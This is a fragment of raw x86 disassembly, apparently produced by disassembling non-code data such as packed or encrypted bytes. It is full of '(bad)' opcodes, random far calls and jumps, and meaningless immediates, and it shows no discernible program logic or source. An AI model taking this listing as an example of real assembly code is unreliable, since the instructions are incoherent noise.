  41ee47:	ins    DWORD PTR es:[edi],dx
  41ee48:	(bad)  
  41ee49:	ins    BYTE PTR es:[edi],dx
  41ee4a:	jae    0x41ee2d
  41ee4c:	stc    
  41ee4d:	ins    WORD PTR es:[edi],dx
  41ee4f:	mov    edi,0x97d737ad
  41ee54:	je     0x41eeb6
  41ee56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee57:	mov    esi,0x2c4328d4
  41ee5c:	scas   eax,DWORD PTR es:[edi]
  41ee5d:	mov    gs,WORD PTR [esi]
  41ee5f:	sub    cl,BYTE PTR [edx+eax*1-0x1e]
  41ee63:	outs   dx,DWORD PTR ds:[esi]
  41ee64:	xor    al,BYTE PTR ds:0xd5923370
  41ee6a:	mov    eax,0xede2300b
  41ee6f:	arpl   WORD PTR [eax+0x5f],ax
  41ee72:	sub    esi,esi
  41ee74:	shl    ah,0x5f
  41ee77:	add    BYTE PTR ds:0x65a482a2,ah
  41ee7d:	retf   
  41ee7e:	push   edi
  41ee7f:	inc    edx
  41ee80:	fidivr DWORD PTR [eax+edi*4]
  41ee83:	aas    
  41ee84:	mov    ebp,0x720cfc86
  41ee89:	call   0x792b:0x822876d6
  41ee90:	jbe    0x41eed3
  41ee92:	jl     0x41ee46
  41ee94:	cwde   
  41ee95:	push   esp
  41ee96:	sub    eax,0x553a221d
  41ee9b:	inc    ecx
  41ee9c:	inc    esi
  41ee9d:	pushf  
  41ee9e:	jg     0x41ee7d
  41eea0:	sbb    edx,esi
  41eea2:	push   edi
  41eea3:	cli    
  41eea4:	aad    0xb1
  41eea6:	(bad)  
  41eea8:	xchg   ebx,eax
  41eea9:	hlt    
  41eeaa:	jno    0x41eedf
  41eeac:	adc    al,0x8
  41eeae:	add    eax,0x1e969f9a
  41eeb3:	shr    BYTE PTR [esi+0x53],1
  41eeb6:	jmp    FWORD PTR [edi]
  41eeb8:	add    ebp,DWORD PTR [ebx+0x1f]
  41eebb:	sub    ebx,ebx
  41eebd:	dec    edi
  41eebe:	clc    
  41eebf:	push   ds
  41eec0:	imul   esi,ebp,0xd56e8750
  41eec6:	in     eax,dx
  41eec7:	mov    cl,0xca
  41eec9:	pop    edx
  41eeca:	mov    bl,0xba
  41eecc:	and    DWORD PTR [edi],eax
  41eece:	(bad)  
  41eecf:	(bad)  
  41eed0:	out    dx,eax
  41eed1:	idiv   BYTE PTR [ecx+0x126da778]
  41eed7:	loopne 0x41ee7a
  41eed9:	mov    dl,0x86
  41eedb:	xor    bh,al
  41eedd:	sbb    BYTE PTR [ebx-0x4],bl
  41eee0:	push   ebp
  41eee1:	mov    ah,BYTE PTR [ebx-0x6]
  41eee4:	ror    BYTE PTR [edi-0x52],1
  41eee7:	xchg   edi,eax
  41eee8:	jns    0x41ef30
  41eeea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eeeb:	addps  xmm4,XMMWORD PTR [edx+eiz*4-0x6579c013]
  41eef3:	enter  0xe6a5,0xc5
  41eef7:	dec    ecx
  41eef8:	dec    edi
  41eef9:	shr    BYTE PTR [esi-0x21990d2d],0xb2
  41ef00:	adc    eax,0x21c7527a
  41ef05:	xchg   ebx,esi
  41ef07:	loop   0x41ef6e
  41ef09:	lock jg 0x41ef5f
  41ef0c:	in     eax,0x25
  41ef0e:	call   0x243:0x99c0b47f
  41ef15:	lods   al,BYTE PTR ds:[esi]
  41ef16:	jl     0x41ef8c
  41ef18:	and    al,0xe1
  41ef1a:	(bad)  
  41ef1c:	leave  
  41ef1d:	sub    al,BYTE PTR [esi-0x31]
  41ef20:	jmp    0x41ef50
  41ef22:	mov    ebx,0xb50b51e6
  41ef27:	push   0x2b
  41ef29:	jle    0x41eeaf
  41ef2b:	stos   DWORD PTR es:[edi],eax
  41ef2c:	pushf  
  41ef2d:	loop   0x41eed9
  41ef2f:	dec    edx
  41ef30:	mov    ch,0x68
  41ef32:	fwait
  41ef33:	in     al,0xb3
  41ef35:	stc    
  41ef36:	inc    ecx
  41ef37:	imul   eax,DWORD PTR [esi+0x4606c9d1],0xffffffda
  41ef3e:	addr16 mov esi,0x9b821b16
  41ef44:	loop   0x41ef2a
  41ef46:	pop    ss
  41ef47:	test   eax,0x798768e
  41ef4c:	push   ebx
  41ef4d:	imul   ebx,DWORD PTR [ebx-0x68],0xffffff95
  41ef51:	sub    esi,ebp
  41ef53:	sbb    edi,esp
  41ef55:	mov    WORD PTR [ecx+0x72],cs
  41ef58:	loope  0x41ef0c
  41ef5a:	inc    ecx
  41ef5b:	mov    dl,0xc8
  41ef5d:	mov    ds:0x30928115,al
  41ef62:	outs   dx,DWORD PTR ds:[esi]
  41ef63:	or     al,0x7f
  41ef65:	push   eax
  41ef66:	sub    eax,0xba4de19e
  41ef6b:	(bad)  
  41ef6c:	mov    cl,0xfe
  41ef6e:	or     al,0x39
  41ef70:	loopne 0x41ef7f
  41ef72:	pop    edx
  41ef73:	outs   dx,DWORD PTR ds:[esi]
  41ef74:	xchg   esp,eax
  41ef75:	adc    dh,dh
  41ef77:	xchg   ebx,eax
  41ef78:	outs   dx,BYTE PTR ds:[esi]
  41ef79:	inc    ebx
  41ef7a:	sahf   
  41ef7b:	test   BYTE PTR [edx+0xd10ba6d],dh
  41ef81:	xor    al,0x2f
  41ef83:	adc    al,0x5f
  41ef85:	stos   DWORD PTR es:[edi],eax
  41ef86:	nop
  41ef87:	pop    eax
  41ef88:	scas   eax,DWORD PTR es:[edi]
  41ef89:	lock xchg DWORD PTR [edx],ecx
  41ef8c:	stos   BYTE PTR es:[edi],al
  41ef8d:	mov    ah,0xd5
  41ef8f:	xchg   DWORD PTR [ebp-0x583a7979],esp
  41ef95:	and    ah,ch
  41ef97:	loopne 0x41ef1e
  41ef99:	mov    eax,ds:0x7e94d67b
  41ef9e:	xor    DWORD PTR [edi-0x6632f93a],ebx
  41efa4:	repnz sbb al,0xa6
  41efa7:	or     DWORD PTR [ebp+0x1f],ecx
  41efaa:	jecxz  0x41ef58
  41efac:	dec    ecx
  41efad:	xchg   edi,eax
  41efae:	pop    ss
  41efaf:	pop    ebp
  41efb0:	rcl    DWORD PTR [eax+0x30],cl
  41efb3:	aam    0xda
  41efb5:	in     eax,dx
  41efb6:	pop    ss
  41efb7:	ins    BYTE PTR es:[edi],dx
  41efb8:	add    DWORD PTR [edx+0x3d],ebx
  41efbb:	sub    BYTE PTR [ecx-0x11fcb30c],ah
  41efc1:	mov    bh,0x81
  41efc3:	cmp    ah,BYTE PTR [eax+edi*8+0x5aa3034b]
  41efca:	sbb    ah,BYTE PTR [ebx-0x67]
  41efcd:	xchg   DWORD PTR [esi+edi*2],ebx
  41efd0:	(bad)  
  41efd1:	xchg   ecx,eax
  41efd2:	jmp    0x41f034
  41efd4:	call   0x2f63:0xa1aa577e
  41efdb:	mov    bh,0x82
  41efdd:	dec    esp
  41efde:	inc    eax
  41efdf:	xor    eax,0x83dff953
  41efe4:	push   edx
  41efe5:	or     al,BYTE PTR [eax]
  41efe7:	sbb    al,0xa8
  41efe9:	adc    DWORD PTR [edx-0x4c],ebx
  41efec:	dec    esi
  41efed:	xor    BYTE PTR [ecx],bl
  41efef:	icebp  
  41eff0:	mov    edi,0x286c5355
  41eff5:	cmp    BYTE PTR [edi+0x20],ah
  41eff8:	bound  eax,QWORD PTR [esi]
  41effa:	(bad)
  41effe:	and    bh,bl
  41f000:	push   ss
  41f001:	(bad)
  41f004:	or     eax,DWORD PTR [eax+0x28]
  41f007:	pop    edi
  41f008:	or     eax,0x9dcd8337
  41f00d:	sbb    cl,BYTE PTR [eax-0x7b]
  41f010:	(bad)
  41f014:	ins    BYTE PTR es:[edi],dx
  41f015:	punpckhdq mm4,QWORD PTR [esi-0x2251f39]
  41f01c:	ret    0xd842
  41f01f:	mov    al,ds:0x5ab2f1a5
  41f024:	jno    0x41f008
  41f026:	cmp    al,0x30
  41f028:	test   BYTE PTR [edx+0x3705351d],cl
  41f02e:	leave  
  41f02f:	call   0x2051:0x9033d024
  41f036:	retf   0xd0d6
  41f039:	leave  
  41f03a:	xor    BYTE PTR [ebx+0x1657c527],0xb0
  41f041:	push   cs
  41f042:	nop
  41f043:	mov    dh,0x44
  41f045:	rol    al,1
  41f047:	out    dx,al
  41f048:	jp     0x41efda
  41f04a:	and    eax,0xd1bc36df
  41f04f:	dec    esi
  41f050:	loopne 0x41f094
  41f052:	lods   al,BYTE PTR ds:[esi]
  41f053:	mov    ss,WORD PTR [edx-0x2212abee]
  41f059:	mov    al,ds:0x3241f80e
  41f05e:	sub    ch,ah
  41f060:	test   al,0x42
  41f062:	test   ebp,edx
  41f064:	enter  0xfc51,0xdd
  41f068:	repnz fwait
  41f06a:	add    eax,0x42172766
  41f06f:	dec    edi
  41f070:	inc    ebp
  41f071:	and    BYTE PTR [edx],dh
  41f073:	push   cs
  41f074:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f075:	arpl   WORD PTR [esi+0x22],di
  41f078:	(bad)  
  41f079:	mov    ebx,0x5035e671
  41f07e:	dec    esi
  41f07f:	xor    edi,eax
  41f081:	push   0xb11dcd65
  41f086:	mov    eax,gs
  41f088:	cmp    al,0x25
  41f08a:	cmp    al,0x3
  41f08c:	sub    bl,BYTE PTR [ebp-0x27]
  41f08f:	xor    eax,0x741bcb84
  41f094:	and    DWORD PTR [ebp-0x72c4a42f],0xa0b8dfe0
  41f09e:	fcomp  QWORD PTR [ebx+eiz*2]
  41f0a1:	lea    ebp,[ebp+0x4c]
  41f0a4:	mov    DWORD PTR [ecx+0x5f4872e2],esi
  41f0aa:	inc    ebp
  41f0ab:	or     BYTE PTR [edi],ah
  41f0ad:	jmp    DWORD PTR [eax]
  41f0af:	xor    eax,0x4638fab3
  41f0b4:	fstp   TBYTE PTR [edx+edi*8-0x605813a3]
  41f0bb:	lds    edi,FWORD PTR [ebx-0x60]
  41f0be:	test   al,0x73
  41f0c0:	xchg   edx,eax
  41f0c1:	or     esi,DWORD PTR ds:0xd1953529
  41f0c7:	inc    esi
  41f0c8:	ret    
  41f0c9:	sub    al,0xe3
  41f0cb:	fldenv [eax]
  41f0cd:	adc    BYTE PTR [esi+0x27],0x8b
  41f0d1:	sub    BYTE PTR [eax+0xd],0xb6
  41f0d5:	jp     0x41f0d3
  41f0d7:	and    al,0xb1
  41f0d9:	inc    edx
  41f0da:	std    
  41f0db:	dec    esi
  41f0dc:	jo     0x41f06d
  41f0de:	mov    edx,0x90263cec
  41f0e3:	je     0x41f0e3
  41f0e5:	pushf  
  41f0e6:	arpl   cx,ax
  41f0e8:	ja     0x41f08f
  41f0ea:	jnp    0x41f0b6
  41f0ec:	add    DWORD PTR [eax-0x3c],0x229246a8
  41f0f3:	ja     0x41f11c
  41f0f5:	fmul   st,st(3)
  41f0f7:	lds    ecx,FWORD PTR [ebp-0x30]
  41f0fa:	cmp    esi,edx
  41f0fc:	mov    ecx,0x143b5a4f
  41f101:	stc    
  41f102:	sbb    BYTE PTR ds:0xf26d9146,bh
  41f108:	push   0xb64de877
  41f10d:	aas    
  41f10e:	aad    0x9
  41f110:	sub    ah,BYTE PTR [eax]
  41f112:	cmp    esp,DWORD PTR [edx]
  41f114:	fs jns 0x41f193
  41f117:	jne    0x41f12b
  41f119:	dec    ebp
  41f11a:	unpckhps xmm5,XMMWORD PTR [eax]
  41f11d:	xor    eax,0x1470caa1
  41f122:	jbe    0x41f15d
  41f124:	rcr    DWORD PTR [esp+ebx*8+0x7b036144],cl
  41f12b:	sbb    BYTE PTR [edi],0x7a
  41f12e:	jge    0x41f146
  41f130:	dec    esp
  41f131:	lea    edi,[ebx]
  41f133:	jle    0x41f125
  41f135:	scas   al,BYTE PTR es:[edi]
  41f136:	xchg   edi,eax
  41f137:	rcl    BYTE PTR [eax-0x53],1
  41f13a:	and    BYTE PTR [ecx],0xff
  41f13d:	jae    0x41f172
  41f13f:	ret    
  41f140:	lahf   
  41f141:	mov    ch,0x9d
  41f143:	dec    esi
  41f144:	ret    0xc3eb
  41f147:	jnp    0x41f133
  41f149:	inc    ebx
  41f14a:	pop    es
  41f14b:	pop    esp
  41f14c:	xchg   ah,al
  41f14e:	mov    esp,0xb5ec260a
  41f153:	adc    DWORD PTR [esi-0x57],0x7c
  41f157:	inc    edi
  41f158:	xchg   edx,eax
  41f159:	mov    ebp,0x2ff189f7
  41f15e:	jb     0x41f132
  41f160:	stos   BYTE PTR es:[edi],al
  41f161:	cmp    esp,DWORD PTR [ecx+0x26ee857d]
  41f167:	rol    BYTE PTR [esi+0x1],1
  41f16a:	lds    ecx,FWORD PTR [ebp+0x4d]
  41f16d:	pop    es
  41f16e:	jb     0x41f167
  41f170:	mov    esi,0x956d7781
  41f175:	out    0xa4,al
  41f177:	scas   eax,DWORD PTR es:[edi]
  41f178:	jmp    0xb602:0xb00acfd2
  41f17f:	dec    ebp
  41f180:	mov    eax,0x5352bdc0
  41f185:	sbb    dh,ch
  41f187:	and    al,0xf7
  41f189:	lahf   
  41f18a:	add    DWORD PTR [ebp-0x54],0xffffffd6
  41f18e:	sbb    eax,0xa253f6a5
  41f193:	popa   
  41f194:	rdpmc  
  41f196:	inc    edi
  41f197:	cld    
  41f198:	outs   dx,DWORD PTR ds:[esi]
  41f199:	adc    al,0x73
  41f19b:	stos   DWORD PTR es:[edi],eax
  41f19c:	push   es
  41f19d:	fdivr  st,st(4)
  41f19f:	push   eax
  41f1a0:	add    ah,BYTE PTR [ecx]
  41f1a2:	and    DWORD PTR [ebx+0xb3c6cc9],0xa2cff4a2
  41f1ac:	cs repz push ecx
  41f1af:	fist   WORD PTR [ecx-0x213b9e40]
  41f1b5:	out    dx,eax
  41f1b6:	cdq    
  41f1b7:	mul    DWORD PTR [ebp-0x6a359a4f]
  41f1bd:	sub    ah,BYTE PTR [esi+0xe]
  41f1c0:	call   0xa54c93a8
  41f1c5:	ja     0x41f1a6
  41f1c7:	cwde   
  41f1c8:	inc    ecx
  41f1c9:	mov    ah,0xa6
  41f1cb:	push   cs
  41f1cc:	and    DWORD PTR [ebx],ebp
  41f1ce:	js     0x41f238
  41f1d0:	lods   eax,DWORD PTR ds:[esi]
  41f1d1:	inc    ebp
  41f1d2:	cmp    BYTE PTR [edx+0x75e7a01a],bl
  41f1d8:	es lock in eax,dx
  41f1db:	iret   
  41f1dc:	mov    esp,0xf8e7e235
  41f1e1:	jbe    0x41f1c3
  41f1e3:	adc    ecx,DWORD PTR [eax-0x31]
  41f1e6:	retf   
  41f1e7:	sbb    al,0x5d
  41f1e9:	cwde   
  41f1ea:	call   0xd846:0x3bbe08e4
  41f1f1:	dec    eax
  41f1f2:	fwait
  41f1f3:	xor    BYTE PTR [edx-0x74],dl
  41f1f6:	and    BYTE PTR [eax+0x4],ah
  41f1f9:	lock xchg ebp,eax
  41f1fb:	adc    al,0xe2
  41f1fd:	in     eax,dx
  41f1fe:	inc    edi
  41f1ff:	jmp    0xe6f223b6
  41f204:	cmp    eax,ecx
  41f206:	sbb    al,0x81
  41f208:	mov    esp,0x50a7208f
  41f20d:	inc    ecx
  41f20e:	sub    ch,ch
  41f210:	into   
  41f211:	inc    esi
  41f212:	lds    esp,FWORD PTR ds:0xd5a83b2d
  41f218:	xlat   BYTE PTR ds:[ebx]
  41f219:	adc    eax,0x7b95a4bc
  41f21e:	outs   dx,DWORD PTR ds:[esi]
  41f21f:	dec    edx
  41f220:	add    bh,al
  41f222:	sti    
  41f223:	dec    edi
  41f224:	cmp    cl,BYTE PTR [edx+ebx*8-0x71d0a6d3]
  41f22b:	add    bh,0x76
  41f22e:	or     al,0x99
  41f230:	pop    es
  41f231:	xchg   esi,eax
  41f232:	test   eax,0xb977e9f2
  41f237:	mov    WORD PTR [esi-0x35c2822c],gs
  41f23d:	push   eax
  41f23e:	and    eax,0x14f407c2
  41f243:	mov    WORD PTR [eax+0x36],cs
  41f246:	dec    edi
  41f247:	push   ds
  41f248:	xchg   ebx,eax
  41f249:	add    al,BYTE PTR [esi]
  41f24b:	das    
  41f24c:	xor    BYTE PTR [eax],cl
  41f24e:	fstp   TBYTE PTR [ecx-0x1a2ad16d]
  41f254:	call   0x9656ed29
  41f259:	ss mov ah,0xe5
  41f25c:	stos   BYTE PTR es:[edi],al
  41f25d:	add    al,0xc7
  41f25f:	push   ss
  41f260:	sbb    bl,BYTE PTR [ebx]
  41f262:	lds    ebx,FWORD PTR [eax+0x6817f5a6]
  41f268:	push   ecx
  41f269:	js     0x41f1fa
  41f26b:	pop    esi
  41f26c:	jo     0x41f2ac
  41f26e:	loope  0x41f24a
  41f270:	add    BYTE PTR [edx+0xf],cl
  41f273:	in     eax,dx
  41f274:	mov    ds:0x5ac2348e,al
  41f279:	int3   
  41f27a:	lock xchg esp,eax
  41f27c:	dec    eax
  41f27d:	pop    esi
  41f27e:	je     0x41f21a
  41f280:	cmp    al,0x52
  41f282:	js     0x41f225
  41f284:	sub    DWORD PTR [ecx-0x11],ebx
  41f287:	add    al,0x5
  41f289:	fist   DWORD PTR [edx]
  41f28b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f28c:	inc    esi
  41f28d:	in     eax,0x1d
  41f28f:	loope  0x41f277
  41f291:	call   0x80da8ae9
  41f296:	dec    eax
  41f297:	cmp    BYTE PTR [eax-0x3bd24675],0xb1
  41f29e:	push   eax
  41f29f:	test   BYTE PTR [ebp-0x68],ah
  41f2a2:	sub    ebp,DWORD PTR ds:0x4fa4aaba
  41f2a8:	mov    DWORD PTR [esi],esp
  41f2aa:	mov    esp,ebx
  41f2ac:	push   ds
  41f2ad:	sbb    al,BYTE PTR [eax-0x17]
  41f2b0:	data16 add ch,BYTE PTR [eax+0x76]
  41f2b4:	daa    
  41f2b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2b6:	jbe    0x41f24e
  41f2b8:	xchg   esi,eax
  41f2b9:	(bad)  
  41f2ba:	sbb    eax,0xacf25922
  41f2bf:	enter  0xc788,0x19
  41f2c3:	pop    esp
  41f2c4:	ins    DWORD PTR es:[edi],dx
  41f2c5:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2c7:	icebp  
  41f2c8:	mov    ebp,0xf803a6bf
  41f2cd:	rol    DWORD PTR [ebx-0x60],cl
  41f2d0:	dec    esp
  41f2d1:	mov    bh,0xa9
  41f2d3:	mov    BYTE PTR [edi+edx*2],cl
  41f2d6:	sbb    DWORD PTR [eax-0x62b978eb],ebp
  41f2dc:	loope  0x41f341
  41f2de:	out    0xf7,eax
  41f2e0:	pusha  
  41f2e1:	addr16 push ecx
  41f2e3:	mov    cl,0x4f
  41f2e5:	inc    ebp
  41f2e6:	sbb    BYTE PTR [ebx],al
  41f2e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2e9:	inc    edi
  41f2ea:	int3   
  41f2eb:	pusha  
  41f2ec:	xor    eax,0xe73b0d5f
  41f2f1:	sbb    eax,0x5454d327
  41f2f6:	pusha  
  41f2f7:	pop    ecx
  41f2f8:	jo     0x41f2d2
  41f2fa:	ret    0xf5e4
  41f2fd:	add    eax,0x84b3b740
  41f302:	lahf   
  41f303:	retf   0x6c96
  41f306:	pushf  
  41f307:	add    ebp,DWORD PTR [eax+esi*1+0x40b6174d]
  41f30e:	mov    bh,0x3b
  41f310:	sbb    eax,0xfab1a615
  41f315:	or     eax,0x895e3bc2
  41f31a:	jmp    0x996f764
  41f31f:	aam    0x6c
  41f321:	push   edi
  41f322:	xchg   ebx,eax
  41f323:	mov    cl,0x51
  41f325:	iret   
  41f326:	add    al,0x85
  41f328:	pusha  
  41f329:	(bad)  
  41f32a:	idiv   BYTE PTR [esi-0xf]
  41f32d:	cmp    DWORD PTR [edx-0x6b],0xffffffb8
  41f331:	or     DWORD PTR [edx+0x34],ebx
  41f334:	call   0x9ffa:0x600648a4
  41f33b:	(bad)  
  41f33c:	enter  0x9e56,0xa2
  41f340:	pop    eax
  41f341:	pop    ebp
  41f342:	and    eax,0x9deb901e
  41f347:	call   0x8900:0xb67b886c
  41f34e:	js     0x41f2d3
  41f350:	push   0xffffffb2
  41f352:	push   ss
  41f353:	mov    ds:0x69f52702,al
  41f358:	adc    BYTE PTR [edi-0x70],bl
  41f35b:	test   eax,0x9c22e6cb
  41f360:	push   edx
  41f361:	xchg   ebp,eax
  41f362:	std    
  41f363:	jp     0x41f307
  41f365:	pusha  
  41f366:	out    dx,eax
  41f367:	ja     0x41f342
  41f369:	sbb    ebp,edx
  41f36b:	mov    esi,0x2f70e07d
  41f370:	aad    0xb4
  41f372:	jle    0x41f3da
  41f374:	jns    0x41f365
  41f376:	(bad)  
  41f377:	xor    BYTE PTR [edi-0x3c5d14a3],ah
  41f37d:	push   eax
  41f37e:	lea    eax,[ebx-0x7bd51c8]
  41f384:	shl    BYTE PTR [ebx-0x4b37f4b4],1
  41f38a:	fld    QWORD PTR [esi]
  41f38c:	xchg   esi,eax
  41f38d:	scas   al,BYTE PTR es:[edi]
  41f38e:	imul   edi,DWORD PTR [ecx],0xffffffca
  41f391:	add    bl,BYTE PTR [edi+eax*1+0xc]
  41f395:	pop    edi
  41f396:	mov    dl,0x9a
  41f398:	jbe    0x41f32e
  41f39a:	adc    eax,0x9268753f
  41f39f:	loop   0x41f3bb
  41f3a1:	mov    WORD PTR [esi-0x8891a25],gs
  41f3a7:	mov    eax,ds:0x8f79f313
  41f3ac:	lods   al,BYTE PTR ds:[esi]
  41f3ad:	push   ds
  41f3ae:	mov    edi,0x3ff7f6
  41f3b3:	repz dec ebx
  41f3b5:	fwait
  41f3b6:	loop   0x41f338
  41f3b8:	push   ebx
  41f3b9:	and    esp,DWORD PTR [eax]
  41f3bb:	jmp    0x4a5:0x49eb31e
  41f3c2:	fldenv [edx+0x6b]
  41f3c5:	mov    ebp,0x57d7d883
  41f3ca:	(bad)  
  41f3cb:	xchg   ecx,eax
  41f3cc:	(bad)  
  41f3cd:	sub    al,0xd8
  41f3cf:	sub    esp,DWORD PTR [edx-0x2a]
  41f3d2:	mov    al,0x6e
  41f3d4:	arpl   WORD PTR [esi-0x51376839],bp
  41f3da:	inc    edx
  41f3db:	ins    DWORD PTR es:[edi],dx
  41f3dc:	or     al,0x90
  41f3de:	js     0x41f3c8
  41f3e0:	jne    0x41f380
  41f3e2:	jecxz  0x41f428
  41f3e4:	inc    eax
  41f3e5:	or     eax,0xa88e925
  41f3ea:	test   al,0x3b
  41f3ec:	push   ebp
  41f3ed:	test   DWORD PTR [ecx-0x3ce15f75],ecx
  41f3f3:	cmc    
  41f3f4:	int    0xaa
  41f3f6:	xor    dh,BYTE PTR [ecx-0xd]
  41f3f9:	mov    esp,0x3bd724bf
  41f3fe:	arpl   cx,ax
  41f400:	sub    eax,0xc3bbd0f6
  41f405:	scas   al,BYTE PTR es:[edi]
  41f406:	mov    DWORD PTR [ebp-0x39a385eb],esp
  41f40c:	push   es
  41f40d:	sub    eax,0xd1391ef5
  41f412:	push   ds
  41f413:	jmp    0xd58a0152
  41f418:	test   al,0x19
  41f41a:	push   cs
  41f41b:	scas   eax,DWORD PTR es:[edi]
  41f41c:	fild   DWORD PTR ds:0xcf52dc25
  41f422:	sti    
  41f423:	or     BYTE PTR [edi-0x30ea82d2],bh
  41f429:	scas   eax,DWORD PTR es:[edi]
  41f42a:	jns    0x41f41e
  41f42c:	scas   eax,DWORD PTR es:[edi]
  41f42d:	mov    bl,0xf3
  41f42f:	adc    BYTE PTR ds:0x1758eb56,ch
  41f435:	or     esi,ebp
  41f437:	mov    bl,BYTE PTR [ebx]
  41f439:	repnz inc esp
  41f43b:	ss push 0x3
  41f43e:	mov    dl,0x7c
  41f440:	dec    esi
  41f441:	pop    ecx
  41f442:	cmp    edx,DWORD PTR [ecx]
  41f444:	adc    BYTE PTR [edi],cl
  41f446:	(bad)  
  41f448:	cld    
  41f449:	stos   BYTE PTR es:[edi],al
  41f44a:	sub    BYTE PTR [ecx+0x7ff2fd9b],ch
  41f450:	mov    dl,BYTE PTR [ebx+0x50bb80e4]
  41f456:	jbe    0x41f43b
  41f458:	jbe    0x41f42b
  41f45a:	std    
  41f45b:	or     eax,0x876d547d
  41f460:	mov    BYTE PTR [edi],al
  41f462:	cmp    al,0x7e
  41f464:	xchg   DWORD PTR [eax+0x71],ebp
  41f467:	xor    al,0x48
  41f469:	jl     0x41f414
  41f46b:	stos   BYTE PTR es:[edi],al
  41f46c:	jecxz  0x41f47e
  41f46e:	mov    al,0x80
  41f470:	xlat   BYTE PTR ds:[ebx]
  41f471:	xchg   ebx,eax
  41f472:	jno    0x41f4a9
  41f474:	fnstcw WORD PTR [edx-0x18dad6ec]
  41f47a:	out    0xab,al
  41f47c:	sub    BYTE PTR fs:[edi+eiz*1+0x2e852e58],ch
  41f484:	fiadd  WORD PTR [ecx+0x2b75419]
  41f48a:	jbe    0x41f476
  41f48c:	test   DWORD PTR [edx-0xa],eax
  41f48f:	xor    ebx,edi
  41f491:	adc    edi,DWORD PTR [eax-0x11]
  41f494:	push   ebp
  41f495:	inc    esp
  41f496:	dec    esp
  41f497:	ins    BYTE PTR es:[edi],dx
  41f498:	jmp    0xaba8613e
  41f49d:	xchg   edi,eax
  41f49e:	iret   
  41f49f:	xchg   edi,eax
  41f4a0:	inc    eax
  41f4a1:	cmp    bl,bh
  41f4a3:	cmp    eax,0xb0761cfd
  41f4a8:	pop    edi
  41f4a9:	iret   
  41f4aa:	lahf   
  41f4ab:	xor    BYTE PTR [edx],ah
  41f4ad:	lea    esi,[ebp-0x7a]
  41f4b0:	nop
  41f4b1:	mov    cl,0xca
  41f4b3:	pop    esp
  41f4b4:	pop    eax
  41f4b5:	jmp    0x1f14:0xebe73074
  41f4bc:	sub    al,0x75
  41f4be:	aad    0x12
  41f4c0:	add    dl,bh
  41f4c2:	cwde   
  41f4c3:	sbb    dl,BYTE PTR [eax-0x6]
  41f4c6:	jge    0x41f450
  41f4c8:	pop    ebp
  41f4c9:	jg     0x41f4e0
  41f4cb:	push   ss
  41f4cc:	sbb    al,0xf
  41f4ce:	call   0xb48d:0x7b95c5bf
  41f4d5:	ja     0x41f490
  41f4d7:	mov    bl,BYTE PTR [edx+ecx*8-0x1d6d8d32]
  41f4de:	cld    
  41f4df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4e0:	imul   esp,DWORD PTR [ecx-0x20],0x72
  41f4e4:	xor    esi,DWORD PTR [edi-0x31]
  41f4e7:	inc    eax
  41f4e8:	mov    ebx,0x6a95ea0
  41f4ed:	mov    ds:0xe00b905a,eax
  41f4f2:	rcr    eax,1
  41f4f4:	in     eax,0x15
  41f4f6:	sbb    al,0xac
  41f4f8:	or     ah,BYTE PTR [esi+0x142a2b61]
  41f4fe:	mov    ecx,0xeb1b3982
  41f503:	test   BYTE PTR [ebp+0x2],0xc2
  41f507:	or     DWORD PTR [ecx],esi
  41f509:	sub    BYTE PTR [ecx-0x16],bh
  41f50c:	inc    ebx
  41f50d:	xchg   edi,eax
  41f50e:	scas   eax,DWORD PTR es:[edi]
  41f50f:	mov    ch,0x59
  41f511:	pop    edx
  41f512:	mov    ebp,0xcbafcc7c
  41f517:	push   esp
  41f518:	test   BYTE PTR [esi+0x8],cl
  41f51b:	push   edx
  41f51c:	sbb    esp,DWORD PTR [edi+ebx*4]
  41f51f:	inc    edi
  41f520:	push   0xb039024b
  41f525:	mov    ebp,0x3f03007
  41f52a:	cwde   
  41f52b:	inc    eax
  41f52c:	mov    edx,0x9c1d7343
  41f531:	mov    dl,0xb4
  41f533:	aad    0x61
  41f535:	(bad)
  41f538:	xor    bh,BYTE PTR cs:[edx-0x58]
  41f53c:	jo     0x41f5ba
  41f53e:	pop    edx
  41f53f:	add    cl,BYTE PTR [esi+ebp*2-0x17]
  41f543:	xchg   ah,bh
  41f545:	stc    
  41f546:	push   edi
  41f547:	push   ds
  41f548:	stos   DWORD PTR es:[edi],eax
  41f549:	jae    0x41f4f1
  41f54b:	mov    esi,0xe0b956b4
  41f550:	sub    ecx,DWORD PTR [ebp+0x13358d6]
  41f556:	in     eax,dx
  41f557:	and    eax,0x7df43fa1
  41f55c:	inc    edx
  41f55d:	add    al,0xc9
  41f55f:	mov    edi,edi
  41f561:	jmp    0xf62:0x3f47b999
  41f568:	xchg   esi,eax
  41f569:	faddp  st(1),st
  41f56b:	cmc    
  41f56c:	xchg   edi,eax
  41f56d:	mov    ebx,0x15a203ae
  41f572:	arpl   WORD PTR [eax+0x79],bp
  41f575:	fsubr  QWORD PTR [ecx+ebp*4]
  41f578:	gs addr16 jle 0x41f5a0
  41f57c:	cmp    ebx,DWORD PTR [esi]
  41f57e:	lea    edi,[ebp-0x2]
  41f581:	(bad)  [edx-0x7ae02c84]
  41f587:	daa    
  41f588:	es repz inc esp
  41f58b:	pop    ebp
  41f58c:	mov    ecx,0x50ca081c
  41f591:	stos   BYTE PTR es:[edi],al
  41f592:	in     al,0xa7
  41f594:	mov    cl,dh
  41f596:	xor    bh,cl
  41f598:	cmp    al,0x58
  41f59a:	jmp    0x3af1:0x4851b206
  41f5a1:	mov    al,0x7b
  41f5a3:	dec    BYTE PTR [esi+0x43]
  41f5a6:	cmp    al,0x9b
  41f5a8:	in     eax,dx
  41f5a9:	lock and ch,cl
  41f5ac:	add    ebp,edi
  41f5ae:	mov    bh,0x80
  41f5b0:	or     al,BYTE PTR [esi+0x31]
  41f5b3:	mov    al,0x21
  41f5b5:	adc    al,0xc3
  41f5b7:	xchg   esp,eax
  41f5b8:	or     dl,BYTE PTR [esi+0x78f59c42]
  41f5be:	in     al,dx
  41f5bf:	out    0x1c,al
  41f5c1:	inc    ecx
  41f5c2:	jae    0x41f5a3
  41f5c4:	xor    DWORD PTR [ecx-0x62b5e8f6],0x21
